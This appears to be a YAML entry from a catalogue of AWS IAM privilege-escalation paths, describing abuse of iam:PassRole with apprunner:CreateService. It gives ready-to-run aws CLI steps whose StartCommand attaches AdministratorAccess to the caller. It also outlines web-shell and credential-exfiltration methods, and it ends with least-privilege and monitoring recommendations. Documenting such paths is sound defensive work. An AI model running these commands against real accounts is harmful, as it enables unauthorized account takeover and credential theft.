id: apprunner-001
name: iam:PassRole + apprunner:CreateService
category: service-passrole
services:
- iam
- apprunner
description: A principal with `iam:PassRole` and `apprunner:CreateService` can create an AWS App Runner service with a privileged IAM role attached. The service runs with the attached role's permissions, and the attacker has multiple ways to leverage these permissions. They can configure a StartCommand to execute AWS CLI commands when the service starts, deploy a container with a web shell or reverse shell to access the role's credentials via the container metadata service, or use a repository with an apprunner.yaml file containing malicious commands. This technique provides direct privilege escalation to any IAM role that can be attached to App Runner services.
prerequisites:
  admin:
  - A role must exist that trusts tasks.apprunner.amazonaws.com to assume it
  - The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
  lateral:
  - A role must exist that trusts tasks.apprunner.amazonaws.com to assume it
exploitationSteps:
  awscli:
  - step: 1
    command: aws sts get-caller-identity
    description: Verify your current identity and note your username for the next step
  - step: 2
    command: |
      aws apprunner create-service \
        --service-name privesc-service \
        --source-configuration '{
          "ImageRepository": {
            "ImageIdentifier": "public.ecr.aws/aws-cli/aws-cli:latest",
            "ImageRepositoryType": "ECR_PUBLIC",
            "ImageConfiguration": {
              "Port": "8080",
              "StartCommand": "iam attach-user-policy --user-name YOUR_USERNAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
            }
          },
          "AutoDeploymentsEnabled": false
        }' \
        --instance-configuration '{
          "Cpu": "1 vCPU",
          "Memory": "2 GB",
          "InstanceRoleArn": "arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE"
        }'
    description: Create an App Runner service using the public AWS CLI image with a StartCommand that grants admin access to your user
  - step: 3
    command: aws apprunner describe-service --service-arn SERVICE_ARN --query 'Service.Status'
    description: Wait for the service to reach 'RUNNING' status (may take 3-5 minutes). The StartCommand executes when the service starts, attaching AdministratorAccess to your user.
  - step: 4
    command: sleep 15
    description: Wait 15 seconds for IAM policy changes to propagate
  - step: 5
    command: aws iam list-users --max-items 3
    description: Verify administrator access by listing IAM users (should now succeed)
recommendation: |
  Restrict the `iam:PassRole` permission using the principle of least privilege.

  ```json
  {
    "Effect": "Allow",
    "Action": "iam:PassRole",
    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificAppRunnerRole",
    "Condition": {
      "StringEquals": {
        "iam:PassedToService": "apprunner.amazonaws.com"
      }
    }
  }
  ```

  Additional controls:
  - Restrict `apprunner:CreateService` permissions to specific users/roles
  - Monitor CloudTrail for App Runner service creation with privileged roles
  - Alert on services using StartCommand to execute IAM, STS, or security-related commands
  - Use VPC configuration to isolate App Runner services
  - Implement container image scanning and signing
  - Only allow images from trusted ECR repositories (consider blocking public ECR if not needed)
  - Alert on App Runner services created with administrative roles
  - Use AWS Config to detect services with overly permissive roles
discoveredBy:
  name: Riyaz Walikar
  organization: Appsecco
  date: '2021'
references:
- title: Getting Shell and Data Access in AWS App Runner
  url: https://blog.appsecco.com/getting-shell-and-data-access-in-aws-app-runner-3632e844bc77
- title: HackTricks Cloud - AWS App Runner Privilege Escalation
  url: https://cloud.hacktricks.wiki/pentesting-cloud/aws-security/aws-privilege-escalation/aws-apprunner-privesc
relatedPaths:
- apprunner-002
- lambda-001
- ec2-001
toolSupport:
  pmapper: false
  iamVulnerable: false
attackVisualization:
  nodes:
    - id: start
      label: Starting Principal
      type: principal
      description: |
        The principal with iam:PassRole and apprunner:CreateService permissions. Can be an IAM user or role.

    - id: apprunner_service
      label: New App Runner Service
      type: resource
      description: |
        New App Runner service created with a privileged IAM role attached. The service runs on AWS-managed infrastructure and automatically assumes the attached role. The attacker can configure the service in multiple ways to leverage the role's permissions.

    - id: target_role
      label: Existing Role That Trusts the Apprunner Service
      type: resource
      description: |
        IAM role passed to the App Runner service as the instance role. The role must trust apprunner.amazonaws.com to assume it. When the App Runner service starts, it assumes this role and provides access to the role's permissions through various methods.

    - id: method_startcommand
      label: "Method 1: StartCommand"
      type: action
      color: '#99ccff'
      description: |
        Configure a StartCommand that executes when the service starts, running AWS CLI commands with the target role's credentials. The StartCommand can perform privileged actions such as:
        - Attaching AdministratorAccess policy to the starting principal
        - Creating new access keys for privileged users
        - Modifying IAM policies or trust relationships
        - Exfiltrating data from S3, secrets, or databases
        - Any AWS API action the target role has permissions for

        Example: `StartCommand: "iam attach-user-policy --user-name YOUR_USERNAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"`

    - id: method_webshell
      label: "Method 2: ECR Image with Web Shell"
      type: action
      color: '#99ccff'
      description: |
        Deploy a container image (from ECR or public registry) containing a web shell or reverse shell. The container runs with the target role's permissions and can access the role's temporary credentials via the container metadata service at 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI.

        The web shell provides an interface to:
        - Query the metadata service for temporary credentials (AccessKeyId, SecretAccessKey, SessionToken)
        - Execute arbitrary commands within the container
        - Exfiltrate the credentials for use outside the container

    - id: method_apprunner_yaml
      label: "Method 3: Repository with apprunner.yaml"
      type: action
      color: '#99ccff'
      description: |
        Point the App Runner service to a source code repository containing a malicious apprunner.yaml configuration file. The apprunner.yaml file can specify build and run commands that execute during the service deployment and startup, running with the target role's permissions.

        The apprunner.yaml can include:
        - Pre-build commands that execute during image build
        - Post-build commands after the build completes
        - Start commands that run when the service starts
        - All commands execute with access to the target role's credentials via environment variables or metadata service

    - id: admin
      label: Effective Administrator
      type: outcome
      description: |
        The target role has AdministratorAccess or equivalent permissions. Using any of the three exploitation methods, the attacker successfully leverages these permissions to gain full administrative access to the AWS account.

    - id: some_perms
      label: Check for Additional Access
      type: outcome
      color: '#ffeb99'
      description: |
        The target role has some elevated permissions (but not full admin). Using any of the three exploitation methods, the attacker can leverage these permissions for data exfiltration (S3, RDS, DynamoDB), modification of security configurations, or additional privilege escalation paths.

    - id: no_access
      label: Minimal Additional Access
      type: outcome
      color: '#cccccc'
      description: |
        The target role only has minimal permissions (like logs:PutLogEvents). Regardless of the exploitation method used, the privilege escalation provides minimal value.

  edges:
    - from: start
      to: apprunner_service
      label: iam:PassRole + apprunner:CreateService
      description: |
        Create a new App Runner service and pass the target role as the instance role. The service can be configured using multiple approaches (StartCommand, container image, or source repository).

        Example command (StartCommand approach):
        ```bash
        aws apprunner create-service \
          --service-name privesc-service \
          --source-configuration '{
            "ImageRepository": {
              "ImageIdentifier": "public.ecr.aws/aws-cli/aws-cli:latest",
              "ImageRepositoryType": "ECR_PUBLIC",
              "ImageConfiguration": {
                "Port": "8080",
                "StartCommand": "iam attach-user-policy --user-name YOUR_USERNAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
              }
            },
            "AutoDeploymentsEnabled": false
          }' \
          --instance-configuration '{
            "Cpu": "1 vCPU",
            "Memory": "2 GB",
            "InstanceRoleArn": "arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE"
          }'
        ```

    - from: apprunner_service
      to: target_role
      label: Service assumes role
      description: |
        The App Runner service automatically assumes the passed instance role when it starts. The service now has access to all permissions granted to this role.

    - from: target_role
      to: method_startcommand
      label: Option A
      description: |
        Use the StartCommand configuration parameter to execute AWS CLI commands when the service starts. The command runs with the target role's credentials.

    - from: target_role
      to: method_webshell
      label: Option B
      description: |
        Deploy a container image containing a web shell or reverse shell. Access the role's credentials via the container metadata service.

    - from: target_role
      to: method_apprunner_yaml
      label: Option C
      description: |
        Configure the service to use a source code repository with a malicious apprunner.yaml file that specifies commands to execute during build and runtime.

    - from: method_startcommand
      to: admin
      label: If target role has admin permissions
      branch: A1
      condition: admin
      description: |
        The StartCommand executes with AdministratorAccess permissions and successfully grants the starting principal full administrative access.

    - from: method_startcommand
      to: some_perms
      label: If target role has some elevated permissions
      branch: A2
      condition: some_permissions
      description: |
        The StartCommand executes with elevated permissions and can perform privileged actions within those permissions.

    - from: method_startcommand
      to: no_access
      label: If target role has minimal permissions
      branch: A3
      condition: no_permissions
      description: |
        The StartCommand has minimal permissions and provides limited value for privilege escalation.

    - from: method_webshell
      to: admin
      label: If target role has admin permissions
      branch: B1
      condition: admin
      description: |
        The web shell successfully exfiltrates credentials with AdministratorAccess permissions, granting full administrative access.

    - from: method_webshell
      to: some_perms
      label: If target role has some elevated permissions
      branch: B2
      condition: some_permissions
      description: |
        The web shell exfiltrates credentials with elevated permissions that can be used for data access or further escalation.

    - from: method_webshell
      to: no_access
      label: If target role has minimal permissions
      branch: B3
      condition: no_permissions
      description: |
        The exfiltrated credentials have minimal permissions and provide limited value.

    - from: method_apprunner_yaml
      to: admin
      label: If target role has admin permissions
      branch: C1
      condition: admin
      description: |
        The apprunner.yaml commands execute with AdministratorAccess permissions and successfully escalate privileges.

    - from: method_apprunner_yaml
      to: some_perms
      label: If target role has some elevated permissions
      branch: C2
      condition: some_permissions
      description: |
        The apprunner.yaml commands execute with elevated permissions and can perform privileged actions.

    - from: method_apprunner_yaml
      to: no_access
      label: If target role has minimal permissions
      branch: C3
      condition: no_permissions
      description: |
        The apprunner.yaml commands have minimal permissions and provide limited value.
permissions:
  required:
  - permission: iam:PassRole
    resourceConstraints: Target role ARN must be in the Resource section
  - permission: apprunner:CreateService
    resourceConstraints: Must have permission to create App Runner services
  additional:
  - permission: iam:ListRoles
    resourceConstraints: Helpful for discovering available roles to pass
  - permission: iam:GetRole
    resourceConstraints: Useful for viewing role trust policies and attached permissions
